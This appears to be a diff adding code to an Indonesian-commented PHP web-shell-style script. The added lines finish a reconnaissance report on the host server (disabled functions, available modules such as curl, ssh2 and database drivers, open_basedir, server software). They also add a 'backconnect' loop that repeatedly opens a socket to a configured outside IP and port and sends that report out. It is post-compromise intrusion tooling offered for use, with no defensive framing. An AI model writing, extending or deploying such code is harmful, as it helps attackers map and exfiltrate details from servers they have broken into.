@@ -166,4 +166,45 @@ function send_info() {
     $output .= "\033[1;33mDisable Functions:\033[0m\t\033[1;37m{$info['disable_functions']}\033[0m\n";
     
     // PHP Modules
-    $output .= "\033[1;33mCURL :\033[0m\t\033[1;37m{$info['curl_status']} | SSH2 : {$info['ssh2_status']} | Magic Quotes : {$info['magic_quotes']} | MySQL : {$info['mysql_status']} | MSSQL : {$info['m
+    $output .= "\033[1;33mCURL :\033[0m\t\033[1;37m{$info['curl_status']} | SSH2 : {$info['ssh2_status']} | Magic Quotes : {$info['magic_quotes']} | MySQL : {$info['mysql_status']} | MSSQL : {$info['mssql_status']} | PostgreSQL : {$info['pgsql_status']} | Oracle : {$info['oracle_status']} | CGI : {$info['cgi_status']}\033[0m\n";
+    
+    // Open_basedir, etc.
+    $output .= "\033[1;33mOpen_basedir :\033[0m\t\033[1;37m{$info['open_basedir']} | Safe_mode_exec_dir : {$info['safe_mode_exec_dir']} | Safe_mode_include_dir : {$info['safe_mode_include_dir']}\033[0m\n";
+    
+    // Software
+    $output .= "\033[1;33mSoftWare:\033[0m\t\033[1;37m{$info['software']}\033[0m\n";
+    
+    $output .= "\n";
+    $output .= "\033[1;32m========================================\033[0m\n";
+    $output .= "\033[1;31m            END OF INFO\033[0m\n";
+    $output .= "\033[1;32m========================================\033[0m\n\n";
+    
+    return $output;
+}
+
+// Fungsi backconnect
+function backconnect($target_ip, $target_port, $reconnect_interval) {
+    while (true) {
+        echo "[*] Mencoba koneksi ke $target_ip:$target_port...\n";
+        
+        // Coba koneksi dengan socket
+        $socket = @fsockopen($target_ip, $target_port, $errno, $errstr, 10);
+        
+        if ($socket) {
+            // Kirim informasi sistem
+            $info = send_info();
+            fwrite($socket, $info);
+            fclose($socket);
+            echo "[*] Informasi terkirim!\n";
+        } else {
+            echo "[!] Koneksi gagal: $errstr ($errno)\n";
+        }
+        
+        echo "[!] Reconnect dalam $reconnect_interval detik...\n";
+        sleep($reconnect_interval);
+    }
+}
+
+// Jalankan backconnect
+backconnect($target_ip, $target_port, $reconnect_interval);
+?>
